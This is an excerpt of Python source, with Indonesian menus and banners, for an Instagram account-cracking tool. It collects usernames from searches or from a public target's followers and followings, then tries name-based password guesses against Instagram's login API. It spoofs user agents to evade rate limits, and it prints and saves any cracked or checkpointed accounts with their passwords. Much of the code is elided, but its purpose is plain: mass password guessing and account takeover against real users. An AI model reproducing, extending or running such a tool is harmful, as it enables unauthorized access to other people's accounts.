...
class instagramAPI:
	...
	DEVICE_SETTINTS = {'manufacturer': 'Oppo',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 450dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
...
class instagram:
   ...
   {H}• {M}• {C}•                                                                                                          
   {U}[*] Email       : Prastt@yahoo.com
   {C}[*] Bergabung   : 6 September 1945
   {H}[*] ---------------------------------------------
   {M}[*] Kadaluwarsa : SAMPE EPEP BUBAR
   {H}[*] Status      : BACOT 
   {U}[*] Author      : PRASTT NO FRIENDS
   {C}[*] ---------------------------------------------
     {O}╔═════════════════════════════╗
     {O}║ {B}• Aku {C} Adalah {M} Wibu•   {O}║               
     {C}╚{O}════{O}═════════{O}════════════════╝{O} 
     
    {M}[01]. crack dari pencarian nama 😎🙏
    {U}[02]. crack dari pengikut🤤
    {H}[03]. crack dari mengikuti😎🤟

    {C}[04]. crack ulang hasil crack
 ...
 [{U}>{C}]  {H}085788764804{C}
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n {O}({M}•{O}) Username yang anda masukan tidak di temukan pastikan target bersifat publik")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			print(f'\n {O}({M}•{O}) Username yang anda masukan tidak di temukan')
		return internal

	def passwordAPI(self,xnx):
		print(f'\n {O}({H}✓{O}) Total username: {H}{len(internal)}{C}')
		print(f"""
 {O}({H}•{O}) List kombinasi Password
	  
 {O}({H}1{O}). {K}V1 {K}[{H}nama, nama123{K}]  
 {O}({H}2{O}). {K}V2 {K}[{H}nama, nama123, nama1234{K}]
 {O}({H}3{O}). {K}V3 {K}[{H}nama, nama123, nama1234, nama12345, sayang, kont*l, anjing{K}]
		""")
		c=input(f' {K}({H}•{K}) password : ')
		if c=='1':
	...
	def generateAPI(self,user,o):
		print(f""" 
 {K}({H}1{O}). {O}UA Version 1.0 
 {K}({H}2{O}). {O}UA Version 2.0 
 {K}({H}3{O}). {O}UA Version 3.0 {K}({H}Disarankan{K}){K}
		""")
		ua=input(f' {O}UserAgent : ')
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		...
		print(f"""
 ({H}•{K}) {O}Hasil {H}OK {O}Tersimpan ke: result/{day}.txt
 ({C}•{K}) {O}Hasil {C}CP {O}Tersimpan ke: result/{day}.txt
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r {K}({H}CRACK{K}) ({K}{loop}/{len(internal)}{K}) {H}OK: - {len(success)}{C}  {C}CP: - {len(checkpoint)}{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {K} ┟── {H} 𝙸𝙽𝚂𝚃𝚁𝙰𝙶𝚁𝙰𝙼 𝙻𝙸𝚅𝙴 🌴
  {K}┞
  {K}┟{C} {H}FulNama: {K}{nama}{C}
  {K}┞{C} {H}Username: {K}{user}{C}
  {K}┟{C} {H}Password: {K}{pw}{C}
  {K}┞{C} {H}Pengikut: {K}{pengikut}{C}
  {K}┟{C} {H}Mengikuti: {K}{mengikut}{C}
  {K}┞{C} {H}Postingan: {K}{postingan}{C}
  {K}│Silahkan Login Akun
  {K}└───╼
					""")
					...
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r  {K}┟── {C}𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙲𝙷𝙴𝙲𝙺𝙿𝙾𝙸𝙽𝚃 🌴
  {K}┞
  {K}┟{C} FulNama: {K}{nama}{C}
  ...
  {K}└───╼
					...
					sys.stdout.write(f"\r [{U}!{C}] {U} hidupkan mode pesawat 30 detik{C}");sys.stdout.flush();sleep(10)
	...
	def checkAPI(self,user,pw):
		try:
			...
			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(100000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
  ...
  {H}╟{C} {H}Silahkan Login
				""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
  {U}╟{C} Ｃｈｅｃｋｐｏｉｎｔ
  {U}╟{C} FulName: {M}{nama}{C}
  {U}╟{C} Username: {M}{user}{C}
  {U}╟{C} Password: {M}{pw}{C}
  {U}╟{C} Pengikut: {M}{pengikut}{C}
  {U}╟{C} Mengikuti: {M}{mengikut}{C}
  {U}╟{C} Postingan: {M}{postingan}{C}
				""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r [{K}!{K}] {U} hidupkan mode pesawat 30 detik{C}");sys.stdout.flush();sleep(10)
	...
	def menu(self):
		...
		if c=='':
			...
			m=int(input(f'\n {O}({H}•{O}) Masukan jumlah target: '));print('')
			for i in range(m):
				i+1
				nama=input(f' {O}({H}•{O}) Masukan nama pencarian ({H}{len(internal)}{C}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			print(f'\n {O}({H}•{O}) Target harus bersifat publik jangan privat')
			m=input(f' {O}({H}•{O}) Masukan username target: ')
